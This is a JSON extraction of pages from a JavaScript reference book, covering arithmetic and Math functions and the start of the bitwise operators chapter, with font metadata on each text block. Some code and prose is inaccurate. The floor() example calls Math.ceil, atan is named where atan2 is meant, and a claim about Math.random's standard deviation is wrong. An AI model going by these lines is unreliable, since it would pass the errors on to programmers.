        "font_size": 9,
        "img": []
    },
    {
        "text": "c  will now be 6 If a string or boolean is provided in place of a number value, it gets converted to a number before the di\ufb00erence is calculated ( 0  for  false ,  1  for  true ):",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "\"5\"   -   1 ;       // 4 7   -   \"3\" ;       // 4 \"5\"   -   true ;    // 4",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "If the string value cannot be converted into a Number, the result will be  NaN :",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "\"foo\"   -   1 ;        // NaN 100   -   \"bar\" ;      // NaN",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Section 14.14: Multiplication (*)",
        "font_name": "Quicksand-Bold",
        "font_size": 18,
        "img": []
    },
    {
        "text": "The multiplication operator ( * ) perform arithmetic multiplication on numbers (literals or variables).",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "console. log (   3   *    5 );   //  15 console. log (- 3   *    5 );   // -15 console. log (   3   *   - 5 );   // -15 console. log (- 3   *   - 5 );   //  15",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Section 14.15: Getting maximum and minimum",
        "font_name": "Quicksand-Bold",
        "font_size": 18,
        "img": []
    },
    {
        "text": "The  Math. max ()  function returns the largest of zero or more numbers.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Math. max ( 4 ,   12 );     //  12 Math. max (- 1 ,   - 15 );   // -1",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "The  Math. min ()  function returns the smallest of zero or more numbers.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Math. min ( 4 ,   12 );     //  4 Math. min (- 1 ,   - 15 );   // -15",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "GoalKicker.com \u2013 JavaScript\u00ae Notes for Professionals 141",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Getting maximum and minimum from an array:",
        "font_name": "OpenSans-Bold",
        "font_size": 10,
        "img": []
    },
    {
        "text": "var  arr  =   [ 1 ,   2 ,   3 ,   4 ,   5 ,   6 ,   7 ,   8 ,   9 ],     max  =  Math. max . apply ( Math ,  arr ),     min  =  Math. min . apply ( Math ,  arr ); console. log ( max );   // Logs: 9 console. log ( min );   // Logs: 1",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "ECMAScript 6  spread operator , getting the maximum and minimum of an array:",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "var  arr  =   [ 1 ,   2 ,   3 ,   4 ,   5 ,   6 ,   7 ,   8 ,   9 ],     max  =  Math. max ( ... arr ),     min  =  Math. min ( ... arr ); console. log ( max );   // Logs: 9 console. log ( min );   // Logs: 1",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Section 14.16: Restrict Number to Min/Max Range",
        "font_name": "Quicksand-Bold",
        "font_size": 18,
        "img": []
    },
    {
        "text": "If you need to clamp a number to keep it inside a speci\ufb01c range boundary",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "function  clamp ( min ,  max ,  val )   {      return  Math. min ( Math. max ( min ,   + val ),  max ); } console. log ( clamp (- 10 ,   10 ,   \"4.30\" ));   // 4.3 console. log ( clamp (- 10 ,   10 ,   - 8 ));       // -8 console. log ( clamp (- 10 ,   10 ,   12 ));       // 10 console. log ( clamp (- 10 ,   10 ,   - 15 ));      // -10",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Use-case example (jsFiddle)",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 14.17: Ceiling and Floor",
        "font_name": "Quicksand-Bold",
        "font_size": 18,
        "img": []
    },
    {
        "text": "ceil ()",
        "font_name": "RobotoMono-Bold",
        "font_size": 9,
        "img": []
    },
    {
        "text": "The  ceil ()  method rounds a number  upwards  to the nearest integer, and returns the result.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Syntax:",
        "font_name": "OpenSans-Bold",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Math. ceil ( n );",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Example:",
        "font_name": "OpenSans-Bold",
        "font_size": 10,
        "img": []
    },
    {
        "text": "console. log ( Math. ceil ( 0.60 ));   //  1 console. log ( Math. ceil ( 0.40 ));   //  1 console. log ( Math. ceil ( 5.1 ));    //  6 console. log ( Math. ceil (- 5.1 ));   // -5 console. log ( Math. ceil (- 5.9 ));   // -5",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "floor ()",
        "font_name": "RobotoMono-Bold",
        "font_size": 9,
        "img": []
    },
    {
        "text": "The  floor ()  method rounds a number  downwards  to the nearest integer, and returns the result.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Syntax:",
        "font_name": "OpenSans-Bold",
        "font_size": 10,
        "img": []
    },
    {
        "text": "GoalKicker.com \u2013 JavaScript\u00ae Notes for Professionals 142",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Math. floor ( n );",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Example:",
        "font_name": "OpenSans-Bold",
        "font_size": 10,
        "img": []
    },
    {
        "text": "console. log ( Math. ceil ( 0.60 ));   //  0 console. log ( Math. ceil ( 0.40 ));   //  0 console. log ( Math. ceil ( 5.1 ));    //  5 console. log ( Math. ceil (- 5.1 ));   // -6 console. log ( Math. ceil (- 5.9 ));   // -6",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Section 14.18: Getting roots of a number",
        "font_name": "Quicksand-Bold",
        "font_size": 18,
        "img": []
    },
    {
        "text": "Square Root",
        "font_name": "OpenSans-Bold",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Use  Math. sqrt ()  to \ufb01nd the square root of a number",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Math. sqrt ( 16 )    # =>   4",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Cube Root",
        "font_name": "OpenSans-Bold",
        "font_size": 10,
        "img": []
    },
    {
        "text": "To \ufb01nd the cube root of a number, use the  Math. cbrt ()  function",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Version \u2265 6",
        "font_name": "DejaVuSansMono",
        "font_size": 8,
        "img": []
    },
    {
        "text": "Math. cbrt ( 27 )   # =>   3",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Finding nth-roots",
        "font_name": "OpenSans-Bold",
        "font_size": 10,
        "img": []
    },
    {
        "text": "To \ufb01nd the nth-root, use the  Math. pow ()  function and pass in a fractional exponent.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Math. pow ( 64 ,   1 / 6 )  # =>   2",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Section 14.19: Random with gaussian distribution",
        "font_name": "Quicksand-Bold",
        "font_size": 18,
        "img": []
    },
    {
        "text": "The  Math. random ()  function should give random numbers that have a standard deviation approaching 0. When picking from a deck of card, or simulating a dice roll this is what we want. But in most situations this is unrealistic. In the real world the randomness tends to gather around an common normal value. If plotted on a graph you get the classical bell curve or gaussian distribution. To do this with the  Math. random ()  function is relatively simple.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "var  randNum  =   ( Math. random ()   +  Math. random ())   /   2 ; var  randNum  =   ( Math. random ()   +  Math. random ()   +  Math. random ())   /   3 ; var  randNum  =   ( Math. random ()   +  Math. random ()   +  Math. random ()   +  Math. random ())   /   4 ;",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Adding a random value to the last increases the variance of the random numbers. Dividing by the number of times you add normalises the result to a range of 0 \u2013 1 As adding more than a few randoms is messy a simple function will allow you to select a variance you want.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "// v is the number of times random is summed and should be over >= 1 // return a random number between 0-1 exclusive",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "function  randomG ( v ){      var  r  =   0 ;      for ( var  i  =  v ;  i  >   0 ;  i  --){         r  +=  Math. random ();",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "GoalKicker.com \u2013 JavaScript\u00ae Notes for Professionals 143",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": "     }      return  r  /  v ; }",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "The image shows the distribution of random values for di\ufb00erent values of v. The top left is standard single Math. random ()  call the bottom right is  Math. random ()  summed 8 times. This is from 5,000,000 samples using Chrome This method is most e\ufb03cient at  v < 5",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": [
            "output_directory\\image_159_1.png"
        ]
    },
    {
        "text": "Section 14.20: Math.atan2 to \ufb01nd direction",
        "font_name": "Quicksand-Bold",
        "font_size": 18,
        "img": []
    },
    {
        "text": "If you are working with vectors or lines you will at some stage want to get the direction of a vector, or line. Or the direction from a point to another point. Math. atan ( yComponent ,  xComponent )  return the angle in radius within the range of  - Math. PI  to  Math. PI  ( - 180  to 180  deg)",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Direction of a vector",
        "font_name": "OpenSans-Bold",
        "font_size": 10,
        "img": []
    },
    {
        "text": "var  vec  =   { x  :   4 ,  y  :   3 }; var  dir  =  Math. atan2 ( vec. y ,  vec. x );    // 0.6435011087932844",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Direction of a line",
        "font_name": "OpenSans-Bold",
        "font_size": 10,
        "img": []
    },
    {
        "text": "var  line  =   {     p1  :   {  x  :   100 ,  y  :   128 },     p2  :   {  x  :   320 ,  y  :   256 } }",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "// get the direction from p1 to p2",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "var  dir  =  Math. atan2 ( line. p2 . y   -  line. p1 . y ,  line. p2 . x   -  line. p1 . x );   // 0.5269432271894297",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Direction from a point to another point",
        "font_name": "OpenSans-Bold",
        "font_size": 10,
        "img": []
    },
    {
        "text": "var  point1  =   {  x :   123 ,  y  :   294 }; var  point2  =   {  x :   354 ,  y  :   284 };",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "// get the direction from point1 to point2",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "var  dir  =  Math. atan2 ( point2. y   -  point1. y ,  point2. x   -  point1. x );   // -0.04326303140726714",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Section 14.21: Sin & Cos to create a vector given direction & distance",
        "font_name": "Quicksand-Bold",
        "font_size": 18,
        "img": []
    },
    {
        "text": "If you have a vector in polar form (direction & distance) you will want to convert it to a cartesian vector with a x and y component. For reference the screen coordinate system has directions as 0 deg points from left to right, 90 (PI/2) point down the screen, and so on in a clock wise direction.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "var  dir  =   1.4536 ;   // direction in radians",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "var  dist  =   200 ;   // distance var  vec  =   {}; vec. x   =  Math. cos ( dir )   *  dist ;   // get the x component",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "GoalKicker.com \u2013 JavaScript\u00ae Notes for Professionals 144",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": "vec. y   =  Math. sin ( dir )   *  dist ;   // get the y component",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "You can also ignore the distance to create a normalised (1 unit long) vector in the direction of  dir",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "var  dir  =   1.4536 ;   // direction in radians",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "var  vec  =   {}; vec. x   =  Math. cos ( dir );   // get the x component vec. y   =  Math. sin ( dir );   // get the y component",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "If your coordinate system has y as up then you need to switch cos and sin. In this case a positive direction is in a counterclockwise direction from the x axis.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "// get the directional vector where y points up var  dir  =   1.4536 ;   // direction in radians",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "var  vec  =   {}; vec. x   =  Math. sin ( dir );   // get the x component vec. y   =  Math. cos ( dir );   // get the y component",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Section 14.22: Math.hypot",
        "font_name": "Quicksand-Bold",
        "font_size": 18,
        "img": []
    },
    {
        "text": "To \ufb01nd the distance between two points we use pythagoras to get the square root of the sum of the square of the component of the vector between them.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "var  v1  =   { x  :   10 ,  y  : 5 }; var  v2  =   { x  :   20 ,  y  :   10 }; var  x  =  v2. x   -  v1. x ; var  y  =  v2. y   -  v1. y ; var  distance  =  Math. sqrt ( x  *  x  +  y  *  y );   // 11.180339887498949",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "With ECMAScript 6 came  Math. hypot  which does the same thing",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "var  v1  =   { x  :   10 ,  y  : 5 }; var  v2  =   { x  :   20 ,  y  :   10 }; var  x  =  v2. x   -  v1. x ; var  y  =  v2. y   -  v1. y ; var  distance  =  Math. hypot ( x , y );   // 11.180339887498949",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Now you don't have to hold the interim vars to stop the code becoming a mess of variables",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "var  v1  =   { x  :   10 ,  y  : 5 }; var  v2  =   { x  :   20 ,  y  :   10 }; var  distance  =  Math. hypot ( v2. x   -  v1. x ,  v2. y   -  v1. y );   // 11.180339887498949",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Math. hypot  can take any number of dimensions",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "// find distance in 3D",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "var  v1  =   { x  :   10 ,  y  :   5 ,  z  :   7 }; var  v2  =   { x  :   20 ,  y  :   10 ,  z  :   16 }; var  dist  =  Math. hypot ( v2. x   -  v1. x ,  v2. y   -  v1. y ,  v2. z   -  v1. z );   // 14.352700094407325",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "// find length of 11th dimensional vector",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "var  v  =   [ 1 , 3 , 2 , 6 , 1 , 7 , 3 , 7 , 5 , 3 , 1 ]; var  i  =   0 ; dist  =  Math. hypot ( v [ i ++], v [ i ++], v [ i ++], v [ i ++], v [ i ++], v [ i ++], v [ i ++], v [ i ++], v [ i ++], v [ i ++], v [ i ++]);",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "GoalKicker.com \u2013 JavaScript\u00ae Notes for Professionals 145",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 14.23: Periodic functions using Math.sin",
        "font_name": "Quicksand-Bold",
        "font_size": 18,
        "img": []
    },
    {
        "text": "Math. sin  and  Math. cos  are cyclic with a period of 2*PI radians (360 deg) they output a wave with an amplitude of 2 in the range -1 to 1. Graph of sine and cosine function:  (courtesy Wikipedia) They are both very handy for many types of periodic calculations, from creating sound waves, to animations, and even encoding and decoding image data This example shows how to create a simple sin wave with control over period/frequency, phase, amplitude, and o\ufb00set. The unit of time being used is seconds. The most simple form with control over frequency only.",
        "font_name": "OpenSans",
        "font_size": 10,
        "comment": "Periodic functions",
        "img": [
            "output_directory\\image_161_1.png"
        ]
    },
    {
        "text": "// time is the time in seconds when you want to get a sample // Frequency represents the number of oscillations per second",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "function  oscillator ( time ,  frequency ){         return  Math. sin ( time  *   2   *  Math. PI   *  frequency ); }",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "In almost all cases you will want to make some changes to the value returned. The common terms for modi\ufb01cations Phase: The o\ufb00set in terms of frequency from the start of the oscillations. It is a value in the range of 0 to 1 where the value 0.5 move the wave forward in time by half its frequency. A value of 0 or 1 makes no change. Amplitude: The distance from the lowest value and highest value during one cycle. An amplitude of 1 has a range of 2. The lowest point (trough) -1 to the highest (peak) 1. For a wave with frequency 1 the peak is at 0.25 seconds, and trough at 0.75. O\ufb00set: moves the whole wave up or down. To include all these in the function:",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "function  oscillator ( time ,  frequency  =   1 ,  amplitude  =   1 ,  phase  =   0 ,  offset  =   0 ){      var  t  =  time  *  frequency  *  Math. PI   *   2 ;   // get phase at time",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "GoalKicker.com \u2013 JavaScript\u00ae Notes for Professionals 146",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": "    t  +=  phase  *  Math. PI   *   2 ;   // add the phase offset",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "     var  v  =  Math. sin ( t );   // get the value at the calculated position in the cycle",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "    v  *=  amplitude ;   // set the amplitude     v  +=  offset ;   // add the offset      return  v ; }",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Or in a more compact (and slightly quicker form):",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "function  oscillator ( time ,  frequency  =   1 ,  amplitude  =   1 ,  phase  =   0 ,  offset  =   0 ){      return  Math. sin ( time  *  frequency  *  Math. PI   *   2   +  phase  *  Math. PI   *   2 )   *  amplitude  +  offset ; }",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "All the arguments apart from time are optional",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 14.24: Division (/)",
        "font_name": "Quicksand-Bold",
        "font_size": 18,
        "img": []
    },
    {
        "text": "The division operator ( / ) perform arithmetic division on numbers (literals or variables).",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "console. log ( 15   /   3 );   // 5 console. log ( 15   /   4 );   // 3.75",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Section 14.25: Decrementing (--)",
        "font_name": "Quicksand-Bold",
        "font_size": 18,
        "img": []
    },
    {
        "text": "The decrement operator ( -- ) decrements numbers by one. If used as a post\ufb01x to  n , the operator returns the current  n  and  then  assigns the decremented the value. If used as a pre\ufb01x to  n , the operator assigns the decremented  n  and  then  returns the changed value.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "var  a  =   5 ,      // 5     b  =  a --,    // 5     c  =  a      // 4",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "In this case,  b  is set to the initial value of  a . So,  b  will be 5, and  c  will be 4.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "var  a  =   5 ,      // 5     b  =   -- a ,    // 4     c  =  a      // 4",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "In this case,  b  is set to the new value of  a . So,  b  will be 4, and  c  will be 4.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Common Uses",
        "font_name": "OpenSans-Bold",
        "font_size": 10,
        "img": []
    },
    {
        "text": "The decrement and increment operators are commonly used in  for  loops, for example:",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "for   ( var  i  =   42 ;  i  >   0 ;   -- i )   {   console. log ( i ) }",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Notice how the  pre\ufb01x  variant is used. This ensures that a temporarily variable isn't needlessly created (to return the value prior to the operation). Note:  Neither  --  nor  ++  are like normal mathematical operators, but rather they are very concise operators for  assignment . Notwithstanding the return value, both",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "GoalKicker.com \u2013 JavaScript\u00ae Notes for Professionals 147 x-- and --x",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": "reassign to  x  such that  x  =  x  -   1 .",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "const  x  =   1 ;",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "console. log ( x --)    // TypeError: Assignment to constant variable. console. log (-- x )    // TypeError: Assignment to constant variable. console. log (-- 3 )    // ReferenceError: Invalid left-hand size expression in prefix operation. console. log ( 3 --)    // ReferenceError: Invalid left-hand side expression in postfix operation.",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "GoalKicker.com \u2013 JavaScript\u00ae Notes for Professionals 148",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Chapter 15: Bitwise operators",
        "font_name": "Quicksand-Bold",
        "font_size": 26,
        "img": []
    },
    {
        "text": "Section 15.1: Bitwise operators",
        "font_name": "Quicksand-Bold",
        "font_size": 18,
        "img": []
    },
    {
        "text": "Bitwise operators perform operations on bit values of data. These operators convert operands to signed 32-bit integers in  two's complement .",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Conversion to 32-bit integers",
        "font_name": "OpenSans-Bold",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Numbers with more than 32 bits discard their most signi\ufb01cant bits. For example, the following integer with more than 32 bits is converted to a 32-bit integer:",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Before :   10100110111110100000000010000011110001000001 After :                10100000000010000011110001000001",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Two's Complement",
        "font_name": "OpenSans-Bold",
        "font_size": 10,
        "img": []
    },
    {
        "text": "In normal binary we \ufb01nd the binary value by adding the  1 's based on their position as powers of 2 - The rightmost bit being  2 ^ 0  to the leftmost bit being  2 ^ n - 1  where  n  is the number of bits. For example, using 4 bits:",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "// Normal Binary // 8 4 2 1",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "    0   1   1   0    =>   0   +   4   +   2   +   0   =>   6",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Two complement's format means that the number's negative counterpart (6 vs -6) is all the bits for a number inverted, plus one. The inverted bits of 6 would be:",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "// Normal binary",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "    0   1   1   0",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "// One's complement (all bits inverted)",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "    1   0   0   1    =>   - 8   +   0   +   0   +   1   =>   - 7",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "// Two's complement (add 1 to one's complement)",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "    1   0   1   0    =>   - 8   +   0   +   2   +   0   =>   - 6",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Note:  Adding more  1 's to the left of a binary number does not change its value in two's compliment. The value  1010 and  1111111111010  are both  -6 .",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Bitwise AND",
        "font_name": "OpenSans-Bold",
        "font_size": 10,
        "img": []
    },
    {
        "text": "The bitwise AND operation  a  &  b  returns the binary value with a  1  where both binary operands have  1 's in a speci\ufb01c position, and  0  in all other positions. For example:",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "13   &   7   =>   5",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "// 13:     0..01101 //  7:     0..00111 //----------------- //  5:     0..00101 (0 + 0 + 4 + 0 + 1)",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Real world example: Number's Parity Check",
        "font_name": "OpenSans-Bold",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Instead of this \"masterpiece\" (unfortunately too often seen in many real code parts):",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "function  isEven ( n )   {      return  n  %   2   ==   0 ; }",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "GoalKicker.com \u2013 JavaScript\u00ae Notes for Professionals 149",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": "function  isOdd ( n )   {      if   ( isEven ( n ))   {",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "         return   false ;",
        "font_name": "RobotoMono-Bold",
        "font_size": 9,
        "img": []
    },
    {
        "text": "     }   else   {          return   true ;      } }",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "You can check the (integer) number's parity in much more e\ufb00ective and simple manner:",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "if ( n  &   1 )   {     console. log ( \"ODD!\" ); }   else   {     console. log ( \"EVEN!\" ); }",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Bitwise OR",
        "font_name": "OpenSans-Bold",
        "font_size": 10,
        "img": []
    },
    {
        "text": "The bitwise OR operation  a  |  b  returns the binary value with a  1  where either operands or both operands have  1 's in a speci\ufb01c position, and  0  when both values have  0  in a position. For example:",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "13   |   7   =>   15",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "// 13:     0..01101 //  7:     0..00111 //----------------- // 15:     0..01111 (0 + 8 + 4 + 2 + 1)  ",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Bitwise NOT",
        "font_name": "OpenSans-Bold",
        "font_size": 10,
        "img": []
    },
    {
        "text": "The bitwise NOT operation  ~a   \ufb02ips  the bits of the given value  a . This means all the  1 's will become  0 's and all the  0 's will become  1 's.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "~13 => -14 // 13:     0..01101 //----------------- //-14:     1..10010 (-16 + 0 + 0 + 2 + 0)",
        "font_name": "DejaVuSansMono",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Bitwise XOR",
        "font_name": "OpenSans-Bold",
        "font_size": 10,
        "img": []
    },
    {
        "text": "The bitwise XOR ( exclusive or ) operation  a  ^  b  places a  1  only if the two bits are di\ufb00erent. Exclusive or means  either",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "one or the other, but not both .",
        "font_name": "OpenSans-Italic",
        "font_size": 10,
        "img": []
    },
    {
        "text": "13   ^   7   =>   10",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "// 13:     0..01101 //  7:     0..00111 //----------------- // 10:     0..01010  (0 + 8 + 0 + 2 + 0)",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Real world example: swapping two integer values without additional memory allocation",
        "font_name": "OpenSans-Bold",
        "font_size": 10,
        "img": []
    },
    {
        "text": "var  a  =   11 ,  b  =   22 ; a  =  a  ^  b ; b  =  a  ^  b ; a  =  a  ^  b ; console. log ( \"a = \"   +  a  +   \"; b = \"   +  b ); // a is now 22 and b is now 11",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "GoalKicker.com \u2013 JavaScript\u00ae Notes for Professionals 150",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
